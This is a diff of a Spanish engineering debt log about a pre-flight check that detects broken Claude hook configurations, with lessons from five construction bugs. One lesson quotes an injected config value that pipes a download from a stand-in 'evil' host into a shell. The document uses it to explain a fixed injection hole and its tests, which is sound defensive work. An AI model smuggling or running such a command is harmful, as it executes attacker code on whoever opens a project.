@@ -1,6 +1,6 @@
 # Deudas medidas
 
-**Fecha:** 2026-09-19 · **Commit de referencia:** `f2cc7f8`
+**Fecha:** 2026-09-20 · **Commit de referencia:** `6af70b0`
 
 Lo que se sabe que falta, con evidencia. **Nada entra aquí por intuición**: cada
 entrada lleva `fichero:línea`, una fila de la base, o la corrida que lo destapó.
@@ -227,7 +227,168 @@ docblock que diga «denegado», «bloqueado» o «no puede» sobre una herramien
 
 ---
 
-## 5. Deudas estructurales
+## 5. Conectado el Terminal al registro de observaciones (2026-09-20)
+
+> Es el **(2) del segundo ensayo** —«conectar el Terminal al JSON de
+> observaciones»—, no el bug 2 de §1. Aquel era el modo de permisos.
+
+**Primer órgano del sistema nervioso conectado.** El Terminal ya escribía
+observaciones derivadas de `permission_denials` (`finish-turn.ts:51`); ahora
+escribe también lo que descubre **reparable en el proyecto del cliente**.
+
+Un **pre-vuelo determinista** lee el `.claude/settings.json` del proyecto antes
+de correr el turno, saca sus hooks `PreToolUse` y comprueba que el intérprete
+existe. Si un hook declarado **no puede arrancar**, eso es una barrera rota: el
+proyecto cree estar protegido y no lo está.
+
+| pieza                  | fichero                                          |
+| ---------------------- | ------------------------------------------------ |
+| lectura del dato       | `domain/project/hook-del-proyecto.ts`            |
+| detección              | `domain/project/barrera-rota.ts`                 |
+| derivación de la obs   | `domain/project/observacion-de-barrera.ts`       |
+| área nueva             | `domain/system/areas-del-terminal.ts`            |
+| `command -v` sin shell | `infrastructure/project/interprete-existe.ts`    |
+| pre-vuelo              | `infrastructure/project/barreras-del-proyecto.ts`|
+| fail-closed            | `infrastructure/barrera-guard.ts`                |
+
+- **`kind: 'bug'`, `area: 'barrera-del-proyecto'`** (vocabulario cerrado, tercera
+  familia). Con área propia, dos clientes con la barrera rota suman avistamientos
+  juntos y `vistaEn: 2` da la señal; en `otro` se habría fundido con el cajón.
+- **Fail-closed en autónomo**: el lote NO corre sin la protección. En supervisado
+  no bloquea —hay humano— pero la observación se asienta **igual**.
+- **Del DATO, no de `stderr`.** La config del proyecto es estructura versionada
+  por un esquema; el aviso del CLI es texto inglés que cambia sin avisar.
+
+### 5.1 Cinco fallos cazados durante la construcción — arreglados, con su lección
+
+Ninguno es deuda abierta. Están aquí porque **la lección vale más que el arreglo**.
+Los cinco son patrones que esta sesión ya conocía, reapareciendo en la pieza nueva.
+
+**1. `command -v` con shell era ejecución arbitraria desde la config del cliente.**
+El comando sale del `settings.json` de un repo AUDITADO. Con `sh -c "command -v $x"`,
+un `"command": "x; curl evil|sh"` se habría ejecutado por el simple hecho de
+**abrir el proyecto**. Arreglado recorriendo el `PATH` con `access(X_OK)`, sin
+intérprete, más 3 tests de inyección que fallan si alguien devuelve una shell.
+
+> **LECCIÓN: una defensa que verifica dato del cliente no puede ser ella misma
+> una vía de ejecución.** El pre-vuelo que detecta barreras rotas no puede ser
+> una barrera rota.
+
+**2. Una pared redundante, delatada al romperla.** Tenía
+`if (settings === null) return []` en el pre-vuelo. Al romperla **no cayó ningún
+test**: el dominio ya devuelve lista vacía ante `null`, basura o un `hooks` que no
+es objeto. Era la garantía duplicada encima de donde ya vive. Quitada.
+
+> **LECCIÓN: una comprobación que al romperla no rompe ningún test, no hace nada.**
+> Romper paredes no solo confirma las reales — **delata las pintadas**.
+
+**3. Un test de determinismo que pasaba por SUERTE.** Comparaba dos llamadas
+seguidas, y `Date.now()` devuelve lo mismo dentro del mismo milisegundo: con la
+nota bailando, el test seguía verde. Corregido para **cruzar el milisegundo**, más
+un segundo test que cuenta **filas** de `observation_sightings` —`vistaEn` no se
+movía porque cuenta proyectos, no avistamientos—.
+
+> **LECCIÓN: un test que pasa por coincidencia temporal da falsa confianza, y eso
+> es peor que fallar.** Mismo patrón que el `not.toMatch` que casaba el docblock
+> en vez del código.
+
+**4. El fail-closed podía desarmarse a sí mismo.** `innegociables-derivados`
+deriva sola la puerta —`guardBarrera` casa con `guard\w+`— pero **no el
+pre-vuelo**: `barrerasDelProyecto` no exporta ninguna guarda. Un fix que lo
+hiciera devolver lista vacía apagaría el fail-closed **entero sin tocar la
+puerta**, y habría entrado por auto-merge sin que nadie lo viera. Blindado con un
+test que exige las **dos mitades** en la lista innegociable.
+
+> **LECCIÓN: es `innegociables-derivados` otra vez** —el auto-merge borrando su
+> propia puerta—. **Cada mitad de una defensa nueva tiene que estar protegida, no
+> solo la visible.**
+
+**5. Un byte NUL real dentro de un `.ts`, que pasó el gate entero.** El escape
+` ` de un test se escribió como **byte**, no como texto. Git marcó el
+fichero como binario (`Bin 0 -> 2445 bytes`): habría entrado a `main` **sin diff
+legible**. Y el fichero era justo `interprete-existe.test.ts` — el que prueba que
+el `command -v` no abre una shell. Arreglado con `String.fromCharCode(0)`, que
+deja el fuente en ASCII puro y prueba exactamente lo mismo.
+
+**Lo delató `git diff --stat`, no el gate.** Typecheck, lint y los 3804 tests
+pasaron con el NUL dentro, porque **el código funcionaba**.
+
+> **LECCIÓN: el gate verifica el comportamiento, no la forma en el repo.** Cinco
+> pasos verdes no garantizan que el código sea legible, auditable ni revisable.
+> Un test de seguridad crítico habría llegado a `main` como binario opaco: nadie
+> —ni el próximo agente, ni una revisión humana— podría leer qué prueba, y un
+> fallo dentro pasaría desapercibido **para siempre**, porque el diff no se puede
+> leer. Es la pared pintada llevada al extremo: no una garantía falsa, sino una
+> garantía **ilegible**. `git diff --stat` antes de commitear no es un trámite:
+> es lo único que caza un fichero que funciona y es opaco.
+
+#### El patrón que une a los cinco
+
+| # | fallo                          | patrón                          |
+| - | ------------------------------ | ------------------------------- |
+| 1 | `command -v` con shell         | la defensa que abre otro agujero |
+| 2 | el `null` duplicado            | la pared redundante             |
+| 3 | el test del reloj              | el test que pasa por suerte     |
+| 4 | el pre-vuelo sin proteger      | la defensa que se auto-desarma  |
+| 5 | el byte NUL                    | el verde ilegible               |
+
+> **VERDE NO BASTA.** El test que pasa por coincidencia del reloj, el
+> `not.toMatch` que casaba el docblock, el docblock que mentía sobre seguridad y
+> el fichero binario que pasa el gate son **lo mismo**: verde que no significa lo
+> que parece. La disciplina no es «que el gate pase»; es **«que el gate pase Y
+> que puedas ver por qué»**. El NUL rompe la segunda mitad sin tocar la primera.
+
+### 5.2 Las otras venas del Terminal — arco siguiente, NO abierto
+
+Quedan dos observaciones del backlog esperando la suya, y **no se abrieron a
+propósito**:
+
+| obs  | qué dice                | qué le falta                        |
+| ---- | ----------------------- | ----------------------------------- |
+| [16] | «no puedo instalar»     | un dato estructurado del que salir  |
+| [17] | «herramienta fantasma»  | idem — `check_index_coverage` está en `GRAPH_READ_TOOLS` y el servidor no lo expone |
+
+**La regla que este arco dejó escrita, y que decide cómo se abren:**
+
+1. Si tienen **dato estructurado** (un `rc`, un `permission_denial`, una entrada
+   de config), se derivan de ahí, como la barrera rota salió del
+   `.claude/settings.json`. Eso es barato y no se rompe solo.
+2. Si **solo viven en `stderr`**, es otro arco. `run-accumulator.ts:62` tira el
+   stderr cuando el turno tiene éxito, y conservarlo habilitaría las dos — pero
+   el `stderr` del CLI es **texto inglés sin versionar**: el día que Anthropic
+   cambie la frase, la derivación deja de encontrar nada **y no falla, calla**.
+   Ese arco tiene que traer su propia decisión de «cómo no romperse en silencio»,
+   y sin ella no se abre.
+
+> **Por qué esto es una deuda y no una tarea.** La opción fácil —parsear
+> `stderr`— estaba disponible y se descartó midiendo, no por gusto. Escribirlo
+> aquí es lo que impide que dentro de un mes alguien la tome por ser la corta.
+
+### 5.3 Lo que el pre-vuelo NO cubre (dicho, no escondido)
+
+- Un turno **suelto** en autónomo también edita, y `guardBarrera` lo deja pasar:
+  lo que se decidió bloquear fue el **lote**. Quitar `ejecutaUnLote` es una línea
+  y la costura está puesta; no se amplía sin decidirlo.
+- Solo mira `PreToolUse`. Un `PostToolUse` roto pierde un aviso; un `PreToolUse`
+  roto deja pasar la escritura que venía a impedir. Esa es la línea, y es la
+  correcta mientras lo que se protege sea lo irreversible.
+
+### 5.4 Corrección de un hecho que constaba como aplicado
+
+El arreglo de `raisen-nucleo/.claude/settings.json` —`python`→`python3` en los
+dos hooks, los seis `deny` extendidos a `Edit`/`MultiEdit`, backup
+`.bak-pre-fix-hooks-2026-09-20`— **figuraba como hecho y verificado. No lo está.**
+Medido el 2026-09-20: el fichero sigue con `python`, `command -v python` está
+vacío, no existe ningún `.bak` en la máquina y los `deny` siguen cubriendo solo
+`Write(...)`. La barrera lleva muerta desde julio.
+
+> Es la misma clase de defecto que §4: **una protección dada por buena sin que
+> nadie la comprobara.** Que sea justo lo que este arco vino a detectar no es
+> casualidad; es la razón de que exista.
+
+---
+
+## 6. Deudas estructurales
 
 | deuda                                 | evidencia                                                                   | qué la desbloquea                                                                                                                                    |
 | ------------------------------------- | --------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
@@ -238,7 +399,7 @@ docblock que diga «denegado», «bloqueado» o «no puede» sobre una herramien
 
 ---
 
-## 6. Dónde viven las deudas de FORTRESS sobre su propio código
+## 7. Dónde viven las deudas de FORTRESS sobre su propio código
 
 **No se duplican aquí.** La fuente de verdad es la **Historia de hallazgos del
 proyecto `fortress-command-center`** dentro de la propia app: es la herramienta
